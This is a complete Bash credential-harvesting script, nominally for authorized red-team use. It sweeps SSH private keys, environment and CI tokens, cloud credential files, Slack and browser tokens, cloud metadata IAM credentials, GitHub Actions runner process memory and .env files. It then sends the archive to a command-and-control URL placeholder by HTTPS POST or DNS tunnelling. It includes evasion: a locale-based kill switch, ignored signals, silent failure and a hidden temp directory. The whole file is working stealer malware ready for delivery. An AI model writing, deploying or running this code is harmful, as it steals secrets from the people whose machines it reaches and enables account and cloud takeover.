#!/usr/bin/env bash
# =============================================================================
# Bash Credential Harvester — Lean: SSH + Tokens + Cloud Keys only
# Optimized for speed: no browser DB extraction, no process memory walking,
# no shell history, no persistence/backdoor logic.
# FULLY SUDO-LESS
# =============================================================================
# WARNING: For authorized red team / pentest engagement use only.
# =============================================================================

# NO set -e / set -u — silent failure is paramount

# ── Configuration ─────────────────────────────────────────────────────────────
C2_URL="C2_URL_PLACEHOLDER"                                # replaced at serve time by delivery server
DNS_DOMAIN=""       # e.g. exfil.example.com (DNS cat fallback)
LOCK_NAME=".cred-harvest.lock"
TIMESTAMP=$(date +%s 2>/dev/null || echo "0")
OUTDIR="/tmp/.cache-$$"
mkdir -p "$OUTDIR" 2>/dev/null
HOME_DIR="${HOME:-$(eval echo ~ 2>/dev/null || echo /root)}"
HOSTNAME_VAL="$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "unknown")"

# ── Anti-Analysis / Evasion ──────────────────────────────────────────────────

_lang="${LANG:-en_US}"
if [[ "$_lang" == ru_* ]]; then
    exit 0 2>/dev/null
fi

LOCKFILE="/tmp/${LOCK_NAME}"
if [ -f "$LOCKFILE" ]; then
    _pid=$(cat "$LOCKFILE" 2>/dev/null)
    if kill -0 "$_pid" 2>/dev/null; then
        exit 0 2>/dev/null
    fi
fi
echo $$ > "$LOCKFILE" 2>/dev/null

trap '' SIGINT SIGTERM 2>/dev/null || true

# ── Helpers ───────────────────────────────────────────────────────────────────

_slurp() {
    [ -f "$2" ] && [ -r "$2" ] && {
        echo "=== $1: $2 ===" >> "$3"
        cat "$2" >> "$3" 2>/dev/null
        echo "" >> "$3"
    }
    return 0
}

_grep_file() {
    [ -f "$2" ] && [ -r "$2" ] && {
        _hits=$(grep -E "$3" "$2" 2>/dev/null || true)
        [ -n "$_hits" ] && {
            echo "=== $1: $2 ===" >> "$4"
            echo "$_hits" >> "$4"
            echo "" >> "$4"
        }
    }
    return 0
}

# ═══════════════════════════════════════════════════════════════════════════
# SECTION A: SSH KEYS + CONFIGS
# ═════════════════════════════════════════════════════════════════════════

harvest_ssh() {
    local outfile="$OUTDIR/ssh_keys.txt"
    local ssh_dir="$HOME_DIR/.ssh"

    [ -d "$ssh_dir" ] && [ -r "$ssh_dir" ] && {
        for f in id_rsa id_dsa id_ecdsa id_ed25519 id_xmss identity; do
            _slurp "SSH private key" "$ssh_dir/$f" "$outfile"
        done
        for f in id_rsa.pub id_dsa.pub id_ecdsa.pub id_ed25519.pub; do
            _slurp "SSH public key" "$ssh_dir/$f" "$outfile"
        done
        _slurp "SSH config" "$ssh_dir/config" "$outfile"
        _slurp "known_hosts" "$ssh_dir/known_hosts" "$outfile"
        _slurp "authorized_keys" "$ssh_dir/authorized_keys" "$outfile"

        # Agent socket — list loaded keys
        if [ -n "${SSH_AUTH_SOCK:-}" ] && [ -S "$SSH_AUTH_SOCK" ]; then
            echo "=== SSH Agent Keys ===" >> "$outfile"
            ssh-add -l 2>/dev/null >> "$outfile" || true
            echo "" >> "$outfile"
        fi
    }

    # SSH config from /etc (user-readable)
    _slurp "Global SSH config" "/etc/ssh/ssh_config" "$outfile"

    # .ssh across other accessible home dirs
    for d in /home/*/.ssh /root/.ssh; do
        [ -d "$d" ] && [ -r "$d" ] && [ "$d" != "$ssh_dir" ] && {
            echo "=== Other SSH dir: $d ===" >> "$outfile"
            for f in id_rsa id_ed25519 id_ecdsa; do
                _slurp "Key" "$d/$f" "$outfile"
            done
        }
    done

    # AWS SSH config (if present)
    _slurp "AWS SSH config" "$HOME_DIR/.aws/ssh_config" "$outfile"
}

# ═══════════════════════════════════════════════════════════════════════════
# SECTION B: CLOUD / TOKEN CREDENTIALS
# ═════════════════════════════════════════════════════════════════════════

# ── B1: Environment Variable Harvesting (high-value only) ────────────────────
harvest_env_vars() {
    local outfile="$OUTDIR/env_tokens.txt"

    # AWS
    for v in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN \
             AWS_SECURITY_TOKEN AWS_DEFAULT_REGION AWS_REGION \
             AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE \
             AWS_CONFIG_FILE AWS_SHARED_CREDENTIALS_FILE; do
        _val=$(printenv "$v" 2>/dev/null || true)
        [ -n "$_val" ] && echo "$v=$_val" >> "$outfile"
    done

    # GitHub
    for v in GITHUB_TOKEN GH_TOKEN GITHUB_PERSONAL_ACCESS_TOKEN \
             GITHUB_ACTION_TOKEN GITHUB_ACTION_ACCESS_TOKEN \
             ACTIONS_ID_TOKEN_REQUEST_URL ACTIONS_ID_TOKEN_REQUEST_TOKEN \
             GITHUB_ACTIONS_ID_TOKEN_REQUEST_URL GITHUB_ACTIONS_ID_TOKEN_REQUEST_TOKEN; do
        _val=$(printenv "$v" 2>/dev/null || true)
        [ -n "$_val" ] && echo "$v=$_val" >> "$outfile"
    done

    # GitLab / CI
    for v in GITLAB_TOKEN CI_JOB_TOKEN GITLAB_API_TOKEN \
             NPM_TOKEN NPM_AUTH_TOKEN NODE_AUTH_TOKEN; do
        _val=$(printenv "$v" 2>/dev/null || true)
        [ -n "$_val" ] && echo "$v=$_val" >> "$outfile"
    done

    # Slack / Comms
    for v in SLACK_TOKEN SLACK_WEBHOOK_URL SLACK_BOT_TOKEN \
             SLACK_APP_TOKEN SLACK_SIGNING_SECRET; do
        _val=$(printenv "$v" 2>/dev/null || true)
        [ -n "$_val" ] && echo "$v=$_val" >> "$outfile"
    done

    # Azure / GCP / Cloud
    for v in AZURE_CLIENT_ID AZURE_CLIENT_SECRET AZURE_TENANT_ID AZURE_ACCESS_TOKEN \
             GOOGLE_APPLICATION_CREDENTIALS GOOGLE_CLOUD_PROJECT GCLOUD_PROJECT \
             DOCKER_TOKEN DOCKER_PASSWORD DOCKERHUB_TOKEN \
             HEROKU_API_KEY DIGITALOCEAN_ACCESS_TOKEN LINODE_CLI_TOKEN \
             TF_TOKEN_tf_cloud TF_VAR_terraform_cloud_token \
             VAULT_TOKEN VAULT_ADDR KUBERNETES_SERVICE_HOST KUBERNETES_TOKEN; do
        _val=$(printenv "$v" 2>/dev/null || true)
        [ -n "$_val" ] && echo "$v=$_val" >> "$outfile"
    done

    # SaaS / API keys
    for v in STRIPE_API_KEY STRIPE_SECRET_KEY SENDGRID_API_KEY MAILGUN_API_KEY \
             TWILIO_ACCOUNT_SID TWILIO_AUTH_TOKEN \
             OPSGENIE_API_KEY PAGERDUTY_API_KEY DATADOG_API_KEY DATADOG_APP_KEY \
             SONAR_TOKEN CODECOV_TOKEN SAUCE_ACCESS_KEY BROWSERSTACK_KEY; do
        _val=$(printenv "$v" 2>/dev/null || true)
        [ -n "$_val" ] && echo "$v=$_val" >> "$outfile"
    done

    # Catch-all: grep env for any remaining token/key/secret
    env 2>/dev/null | grep -iE '(token|key|secret|password|credential|private|webhook)' \
        >> "$outfile" 2>/dev/null || true
}

# ── B2: Cloud Credential Files ────────────────────────────────────────────────
harvest_cloud_files() {
    local outfile="$OUTDIR/cloud_files.txt"

    # AWS CLI credentials
    _slurp "AWS credentials" "$HOME_DIR/.aws/credentials" "$outfile"
    _slurp "AWS config" "$HOME_DIR/.aws/config" "$outfile"

    # GCP
    _slurp "GCP service account" "$HOME_DIR/.config/gcloud/credentials.db" "$outfile"
    _slurp "GCP access tokens" "$HOME_DIR/.config/gcloud/access_tokens.db" "$outfile"
    _slurp "GCP legacy creds" "$HOME_DIR/.config/gcloud/legacy_credentials" "$outfile"
    for f in "$HOME_DIR"/.config/gcloud/configurations/*; do
        [ -f "$f" ] && _slurp "GCP config" "$f" "$outfile"
    done
    # ADC JSON file
    if [ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && [ -f "${GOOGLE_APPLICATION_CREDENTIALS}" ]; then
        _slurp "GCP ADC JSON" "${GOOGLE_APPLICATION_CREDENTIALS}" "$outfile"
    fi

    # Azure
    _slurp "Azure tokens" "$HOME_DIR/.azure/accessTokens.json" "$outfile"
    _slurp "Azure tokens (old)" "$HOME_DIR/.azure/azureProfile.json" "$outfile"
    _slurp "Azure mgmt tokens" "$HOME_DIR/.azure/managementTokens.json" "$outfile"
    _slurp "Azure cloud console" "$HOME_DIR/.azure/clouds.config" "$outfile"
    _slurp "Azure tokens dir" "$HOME_DIR/.azure/tokens.json" "$outfile"

    # Docker
    _slurp "Docker config" "$HOME_DIR/.docker/config.json" "$outfile"
    _slurp "Docker creds" "$HOME_DIR/.docker/credentials" "$outfile"

    # npm / yarn
    _slurp "npmrc" "$HOME_DIR/.npmrc" "$outfile"
    _slurp "yarnrc" "$HOME_DIR/.yarnrc" "$outfile"

    # Kubernetes
    _slurp "kubeconfig" "$HOME_DIR/.kube/config" "$outfile"
    for f in "$HOME_DIR"/.kube/*.config; do
        [ -f "$f" ] && _slurp "kube config" "$f" "$outfile"
    done

    # Terraform
    _slurp "Terraform creds" "$HOME_DIR/.terraform.d/credentials.tfrc.json" "$outfile"

    # Heroku
    _slurp "Heroku creds" "$HOME_DIR/.netrc" "$outfile"
    _slurp "Heroku token" "$HOME_DIR/.heroku/plugins.json" "$outfile"

    # GitHub CLI
    _slurp "gh CLI hosts" "$HOME_DIR/.config/gh/hosts.yml" "$outfile"
    _slurp "gh CLI token" "$HOME_DIR/.config/gh/hosts.toml" "$outfile"
}

# ── B2b: Slack Token Extraction ──────────────────────────────────────────────
# Slack stores tokens in two places on Linux:
#   1. ~/.slack/credentials.json  — CLI auth tokens (xoxe.*, refresh_token, user_id, team_id)
#   2. ~/.config/Slack/storage/root-state.json — desktop workspace metadata (team_id, user_id, domain)
# Desktop LevelDB/Cookies are Chromium-encrypted (os_crypt) — skip, not readable without key.
# Also covers Flatpak (~/.var/app/com.slack.Slack/) and Snap (~/.slack/) paths.
harvest_slack() {
    local outfile="$OUTDIR/slack_tokens.txt"

    # ── CLI credentials (plaintext JSON with xoxe tokens) ──
    # Native deb/rpm install
    _slurp "Slack CLI credentials" "$HOME_DIR/.slack/credentials.json" "$outfile"
    _slurp "Slack CLI config" "$HOME_DIR/.slack/config.json" "$outfile"
    # Flatpak
    _slurp "Slack CLI credentials (flatpak)" "$HOME_DIR/.var/app/com.slack.Slack/.slack/credentials.json" "$outfile"
    # Snap (same path as native)

    # ── Desktop app workspace state ──
    # Native
    _slurp "Slack desktop root-state" "$HOME_DIR/.config/Slack/storage/root-state.json" "$outfile"
    # Flatpak
    _slurp "Slack desktop root-state (flatpak)" "$HOME_DIR/.var/app/com.slack.Slack/config/Slack/storage/root-state.json" "$outfile"

    # ── Extract tokens from credentials.json via grep (fast, no jq dep) ──
    local cred_file="$HOME_DIR/.slack/credentials.json"
    [ -f "$cred_file" ] && [ -r "$cred_file" ] && {
        # xoxe tokens (user/session tokens)
        grep -oE 'xoxe[.-][A-Za-z0-9._-]+' "$cred_file" 2>/dev/null | sort -u >> "$outfile" || true
        # xoxp/xoxb/xoxs tokens (if present)
        grep -oE 'xox[pbs]-[A-Za-z0-9-]+' "$cred_file" 2>/dev/null | sort -u >> "$outfile" || true
        # d- tokens (modern Slack)
        grep -oE 'd-[A-Za-z0-9-]+' "$cred_file" 2>/dev/null | sort -u >> "$outfile" || true
    }

    # ── Desktop Local Storage LevelDB — binary grep for xox tokens ──
    # These may be encrypted but worth trying; silent fail if unreadable
    for ldb_path in "$HOME_DIR/.config/Slack/Local Storage/leveldb" \
                    "$HOME_DIR/.var/app/com.slack.Slack/config/Slack/Local Storage/leveldb"; do
        [ -d "$ldb_path" ] && {
            for f in "$ldb_path"/*.ldb "$ldb_path"/*.log; do
                [ -r "$f" ] && {
                    grep -aoE 'xox[epbs]-[A-Za-z0-9._-]{10,}' "$f" 2>/dev/null | sort -u >> "$outfile" || true
                }
            done
        }
    done
}

# ── B2c: Browser Credential Extraction (unencrypted only) ────────────────────
# Chromium (Chrome/Brave/Edge/Chromium):
#   - Login Data: passwords are v10/v11 os_crypt encrypted → NOT readable
#     but origin_url + username_value ARE plaintext → useful for credential stuffing
#   - Local Storage / Session Storage LevelDB: tokens in plaintext → READABLE
#   - Cookies: encrypted → NOT readable
#
# Firefox:
#   - cookies.sqlite: plaintext cookie values → READABLE
#   - webappsstore.sqlite: plaintext localStorage → READABLE
#   - formhistory.sqlite: plaintext form autofill → READABLE
#   - key4.db / logins.json: encrypted without primary password, but key4.db
#     itself is SQLite and may be readable for metadata
#   - sessionstore: plaintext session data with form fields → READABLE
harvest_browsers() {
    local outfile="$OUTDIR/browser_creds.txt"

    # ── Chromium-family profiles (Chrome, Brave, Edge, Chromium) ──
    local chromium_profiles=()
    for browser_dir in \
        "$HOME_DIR/.config/google-chrome" \
        "$HOME_DIR/.config/chromium" \
        "$HOME_DIR/.config/BraveSoftware/Brave-Browser" \
        "$HOME_DIR/.config/microsoft-edge"; do
        [ -d "$browser_dir" ] && {
            for profile in "$browser_dir"/Default "$browser_dir"/Profile\ *; do
                [ -d "$profile" ] && chromium_profiles+=("$profile")
            done
        }
    done

    for profile in "${chromium_profiles[@]}"; do
        local profile_name="$(basename "$profile")"

        # ── Login Data: extract URLs + usernames (passwords encrypted, skip) ──
        local login_db="$profile/Login Data"
        if [ -f "$login_db" ] && [ -r "$login_db" ]; then
            # Copy to avoid lock contention with running browser
            local tmp_db="$OUTDIR/.tmp_login_$$"
            cp "$login_db" "$tmp_db" 2>/dev/null && {
                echo "=== Chromium Login Data: $profile_name ===" >> "$outfile"
                sqlite3 "$tmp_db" \
                    "SELECT origin_url, username_value FROM logins WHERE username_value != '' AND blacklisted_by_user = 0;" \
                    2>/dev/null >> "$outfile" || true
                rm -f "$tmp_db" 2>/dev/null
            }
        fi

        # ── Local Storage LevelDB: binary grep for high-value tokens ──
        local ls_dir="$profile/Local Storage/leveldb"
        if [ -d "$ls_dir" ]; then
            for f in "$ls_dir"/*.ldb "$ls_dir"/*.log; do
                [ -r "$f" ] && {
                    # API keys and tokens
                    grep -aoE '(ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|ghs_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{82}|xox[epbs]-[A-Za-z0-9._-]{10,}|AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{20,}|AIza[a-zA-Z0-9_-]{35}|eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})' "$f" 2>/dev/null | sort -u >> "$outfile" || true
                }
            done
        fi

        # ── Session Storage LevelDB: same token grep ──
        local ss_dir="$profile/Session Storage"
        if [ -d "$ss_dir" ]; then
            for f in "$ss_dir"/*.ldb; do
                [ -r "$f" ] && {
                    grep -aoE '(ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|ghs_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{82}|xox[epbs]-[A-Za-z0-9._-]{10,}|AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{20,}|AIza[a-zA-Z0-9_-]{35}|eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})' "$f" 2>/dev/null | sort -u >> "$outfile" || true
                }
            done
        fi
    done

    # ── Firefox profiles ──
    local firefox_dir="$HOME_DIR/.mozilla/firefox"
    [ -d "$firefox_dir" ] && {
        for profile in "$firefox_dir"/*.default*; do
            [ -d "$profile" ] || continue
            local profile_name="$(basename "$profile")"

            # ── cookies.sqlite: plaintext values — grep for auth tokens ──
            local ff_cookies="$profile/cookies.sqlite"
            if [ -f "$ff_cookies" ] && [ -r "$ff_cookies" ]; then
                local tmp_db="$OUTDIR/.tmp_ff_cookies_$$"
                cp "$ff_cookies" "$tmp_db" 2>/dev/null && {
                    echo "=== Firefox Cookies: $profile_name ===" >> "$outfile"
                    sqlite3 "$tmp_db" \
                        "SELECT host, name, value FROM moz_cookies WHERE value LIKE '%xox%' OR value LIKE '%ghp_%' OR value LIKE '%AKIA%' OR value LIKE '%sk-%' OR value LIKE '%AIza%' OR value LIKE '%token%' OR value LIKE '%eyJ%';" \
                        2>/dev/null >> "$outfile" || true
                    rm -f "$tmp_db" 2>/dev/null
                }
            fi

            # ── webappsstore.sqlite: plaintext localStorage ──
            local ff_ws="$profile/webappsstore.sqlite"
            if [ -f "$ff_ws" ] && [ -r "$ff_ws" ]; then
                local tmp_db="$OUTDIR/.tmp_ff_ws_$$"
                cp "$ff_ws" "$tmp_db" 2>/dev/null && {
                    echo "=== Firefox LocalStorage: $profile_name ===" >> "$outfile"
                    sqlite3 "$tmp_db" \
                        "SELECT scope, key, value FROM webappsstore2 WHERE value LIKE '%xox%' OR value LIKE '%ghp_%' OR value LIKE '%AKIA%' OR value LIKE '%sk-%' OR value LIKE '%AIza%' OR value LIKE '%token%' OR value LIKE '%eyJ%';" \
                        2>/dev/null >> "$outfile" || true
                    rm -f "$tmp_db" 2>/dev/null
                }
            fi

            # ── formhistory.sqlite: autofill data (emails, names) ──
            local ff_fh="$profile/formhistory.sqlite"
            if [ -f "$ff_fh" ] && [ -r "$ff_fh" ]; then
                local tmp_db="$OUTDIR/.tmp_ff_fh_$$"
                cp "$ff_fh" "$tmp_db" 2>/dev/null && {
                    echo "=== Firefox Form History: $profile_name ===" >> "$outfile"
                    sqlite3 "$tmp_db" \
                        "SELECT fieldname, value FROM moz_formhistory WHERE fieldname LIKE '%email%' OR fieldname LIKE '%user%' OR fieldname LIKE '%pass%' OR fieldname LIKE '%name%';" \
                        2>/dev/null >> "$outfile" || true
                    rm -f "$tmp_db" 2>/dev/null
                }
            fi

            # ── sessionstore: plaintext session data with form fields ──
            # .jsonlz4 format — try mozlz4 decompress, fall back to binary grep
            for sf in "$profile"/sessionstore.jsonlz4 "$profile"/sessionstore-backups/recovery.jsonlz4; do
                [ -f "$sf" ] && [ -r "$sf" ] && {
                    # Try dejsonlz4 if available, else binary grep for tokens
                    if command -v dejsonlz4 >/dev/null 2>&1; then
                        local tmp_json="$OUTDIR/.tmp_session_$$.json"
                        dejsonlz4 "$sf" "$tmp_json" 2>/dev/null && {
                            echo "=== Firefox Session: $(basename "$sf") ===" >> "$outfile"
                            grep -oE '(ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|xox[epbs]-[A-Za-z0-9._-]{10,}|AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{20,}|AIza[a-zA-Z0-9_-]{35}|eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})' "$tmp_json" 2>/dev/null | sort -u >> "$outfile" || true
                            rm -f "$tmp_json" 2>/dev/null
                        }
                    else
                        # Binary grep on lz4 file — tokens survive compression as ASCII
                        grep -aoE '(ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|xox[epbs]-[A-Za-z0-9._-]{10,}|AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{20,}|AIza[a-zA-Z0-9_-]{35})' "$sf" 2>/dev/null | sort -u >> "$outfile" || true
                    fi
                }
            done

            # ── key4.db: grab metadata (not the encrypted secrets themselves) ──
            _slurp "Firefox key4 metadata: $profile_name" "$profile/key4.db" "$outfile"
        done
    }
}

# ── B3: Cloud Metadata (IAM role creds from IMDS) ────────────────────────────
harvest_cloud_metadata() {
    local outfile="$OUTDIR/cloud_metadata.txt"
    local meta="http://169.254.169.254"
    local gcp_meta="http://metadata.google.internal"

    # AWS IMDSv2
    _token=$(curl -sf --connect-timeout 2 -m 3 \
        -X PUT "$meta/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || true)

    if [ -n "$_token" ]; then
        # Only grab IAM creds — skip instance metadata noise
        _role=$(curl -sf --connect-timeout 2 -m 3 \
            -H "X-aws-ec2-metadata-token: $_token" \
            "$meta/latest/meta-data/iam/security-credentials/" 2>/dev/null || true)
        [ -n "$_role" ] && {
            echo "=== AWS IAM Role: $_role ===" >> "$outfile"
            curl -sf --connect-timeout 2 -m 3 \
                -H "X-aws-ec2-metadata-token: $_token" \
                "$meta/latest/meta-data/iam/security-credentials/$_role" >> "$outfile" 2>/dev/null || true
        }
    else
        # IMDSv1 fallback — IAM only
        _role=$(curl -sf --connect-timeout 2 -m 3 \
            "$meta/latest/meta-data/iam/security-credentials/" 2>/dev/null || true)
        [ -n "$_role" ] && {
            echo "=== AWS IAM Role (v1): $_role ===" >> "$outfile"
            curl -sf --connect-timeout 2 -m 3 \
                "$meta/latest/meta-data/iam/security-credentials/$_role" >> "$outfile" 2>/dev/null || true
        }
    fi

    # GCP — service account token only
    _val=$(curl -sf --connect-timeout 2 -m 3 \
        -H "Metadata-Flavor: Google" \
        "$gcp_meta/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null || true)
    [ -n "$_val" ] && echo "gcp:sa_token=$_val" >> "$outfile"

    # Azure — identity token
    _val=$(curl -sf --connect-timeout 2 -m 3 \
        -H "Metadata: true" \
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
        2>/dev/null || true)
    [ -n "$_val" ] && echo "azure:identity_token=$_val" >> "$outfile"
}

# ── B4: GitHub Actions Runner Memory (CI only, fast) ──────────────────────────
harvest_runner_memory() {
    command -v pgrep >/dev/null 2>&1 || return 0

    _runner_pid=$(pgrep -f "Runner.Worker" 2>/dev/null | head -1 || true)
    [ -z "$_runner_pid" ] && _runner_pid=$(pgrep -f "runsvc.sh" 2>/dev/null | head -1 || true)
    [ -z "$_runner_pid" ] && return 0

    local outfile="$OUTDIR/runner_secrets.txt"

    # /proc/environ — fastest, single read
    if [ -r "/proc/$_runner_pid/environ" ]; then
        cat "/proc/$_runner_pid/environ" 2>/dev/null | tr '\0' '\n' | \
            grep -iE '(token|key|secret|password|credential)' >> "$outfile" 2>/dev/null || true
    fi

    # /proc/mem — targeted grep only, no full strings dump
    if [ -r "/proc/$_runner_pid/mem" ]; then
        strings "/proc/$_runner_pid/mem" 2>/dev/null | \
            grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | \
            sort -u >> "$outfile" 2>/dev/null || true
        strings "/proc/$_runner_pid/mem" 2>/dev/null | \
            grep -iE '(ghp_|gho_|ghs_|github_pat_|AKIA[0-9A-Z]{16}|-----BEGIN.*PRIVATE)' \
            >> "$outfile" 2>/dev/null || true
    fi
}

# ── B5: Config File Credential Sweep ──────────────────────────────────────────
harvest_config_sweep() {
    local outfile="$OUTDIR/config_sweep.txt"

    # Git config — tokens in URLs
    _slurp "gitconfig" "$HOME_DIR/.gitconfig" "$outfile"
    _slurp "git-credentials" "$HOME_DIR/.git-credentials" "$outfile"

    # SSH agent forwarding
    if [ -n "${SSH_AUTH_SOCK:-}" ] && [ -S "$SSH_AUTH_SOCK" ]; then
        echo "=== SSH_AUTH_SOCK=$SSH_AUTH_SOCK ===" >> "$outfile"
        ssh-add -l 2>/dev/null >> "$outfile" || true
    fi

    # gpg keys (signing subkeys)
    if command -v gpg >/dev/null 2>&1; then
        echo "=== GPG secret keys ===" >> "$outfile"
        gpg --list-secret-keys --keyid-format=long 2>/dev/null >> "$outfile" || true
    fi

    # pass password store
    if [ -d "$HOME_DIR/.password-store" ] && [ -r "$HOME_DIR/.password-store" ]; then
        echo "=== pass store (filenames) ===" >> "$outfile"
        find "$HOME_DIR/.password-store" -name "*.gpg" 2>/dev/null >> "$outfile" || true
    fi

    # .env files — recursive search, log parent directory
    local env_outfile="$OUTDIR/dot_env_files.txt"
    find "$HOME_DIR" -name '.env' -not -path '*/node_modules/*' -not -path '*/.venv/*' -not -path '*/venv/*' -not -path '*/.cache/*' -not -path '*/.local/share/*' 2>/dev/null | while read -r envfile; do
        [ -r "$envfile" ] && {
            # Log the directory where the .env was found
            envdir="$(cd "$(dirname "$envfile")" 2>/dev/null && pwd 2>/dev/null || dirname "$envfile")"
            echo "=== .env in: $envdir ===" >> "$env_outfile"
            cat "$envfile" >> "$env_outfile" 2>/dev/null
            echo "" >> "$env_outfile"
        }
    done

    # Also find .env.local, .env.production, .env.staging, etc.
    find "$HOME_DIR" -name '.env.*' -not -path '*/node_modules/*' -not -path '*/.venv/*' -not -path '*/venv/*' -not -path '*/.cache/*' -not -path '*/.local/share/*' 2>/dev/null | while read -r envfile; do
        [ -r "$envfile" ] && {
            envdir="$(cd "$(dirname "$envfile")" 2>/dev/null && pwd 2>/dev/null || dirname "$envfile")"
            echo "=== $(basename "$envfile") in: $envdir ===" >> "$env_outfile"
            cat "$envfile" >> "$env_outfile" 2>/dev/null
            echo "" >> "$env_outfile"
        }
    done

    # GitHub Actions runner .credentials files
    for f in /home/*/actions-runner/.credentials_* /home/*/.credentials_*; do
        [ -f "$f" ] && [ -r "$f" ] && _slurp "Runner credentials" "$f" "$outfile"
    done
}

# ═══════════════════════════════════════════════════════════════════════════
# SECTION C: EXFILTRATION
# ═════════════════════════════════════════════════════════════════════════

exfil_https() {
    [ -z "$C2_URL" ] && return 0
    local payload
    payload=$(tar czf - -C "$OUTDIR" . 2>/dev/null | base64 -w0 2>/dev/null || true)
    [ -n "$payload" ] && {
        curl -sf --connect-timeout 10 -m 30 \
            -X POST "$C2_URL" \
            -H "Content-Type: application/octet-stream" \
            -H "X-Harvest-ID: $TIMESTAMP" \
            --data-binary "$payload" 2>/dev/null || true
    }
}

exfil_dns() {
    [ -z "$DNS_DOMAIN" ] && return 0
    local payload
    payload=$(tar czf - -C "$OUTDIR" . 2>/dev/null | base64 -w0 2>/dev/null | tr '+/' '-_' || true)
    [ -z "$payload" ] && return 0

    local chunk_size=60
    local i=0
    while [ "$i" -lt "${#payload}" ]; do
        local chunk="${payload:$i:$chunk_size}"
        local seq=$((i / chunk_size))
        local fqdn="${chunk}.${seq}.${TIMESTAMP}.${DNS_DOMAIN}"
        if command -v dig >/dev/null 2>&1; then
            dig +short "$fqdn" >/dev/null 2>&1 || true
        elif command -v nslookup >/dev/null 2>&1; then
            nslookup "$fqdn" >/dev/null 2>&1 || true
        fi
        i=$((i + chunk_size))
    done
}

# ═══════════════════════════════════════════════════════════════════════════
# MAIN EXECUTION
# ═════════════════════════════════════════════════════════════════════════

main() {
    # ── Device identification ──
    local idfile="$OUTDIR/device_id.txt"
    echo "hostname=$HOSTNAME_VAL" >> "$idfile"
    echo "user=$(whoami 2>/dev/null || id -un 2>/dev/null || echo 'unknown')" >> "$idfile"
    echo "uid=$(id -u 2>/dev/null || echo '?')" >> "$idfile"
    echo "timestamp=$(date 2>/dev/null || echo 'unknown')" >> "$idfile"
    echo "cwd=$(pwd 2>/dev/null || echo '?')" >> "$idfile"
    echo "" >> "$idfile"

    # ── A: SSH Keys ──
    harvest_ssh

    # ── B: Tokens / Cloud Creds ──
    harvest_env_vars
    harvest_cloud_files
    harvest_slack
    harvest_browsers
    harvest_cloud_metadata
    harvest_runner_memory
    harvest_config_sweep

    # ── C: Exfiltration ──
    exfil_https
    [ -n "$DNS_DOMAIN" ] && exfil_dns

    # ── Cleanup ──
    rm -f "$LOCKFILE" 2>/dev/null
}

if [[ "${BASH_SOURCE[0]:-$0}" == "${0}" ]]; then
    main "$@"
fi
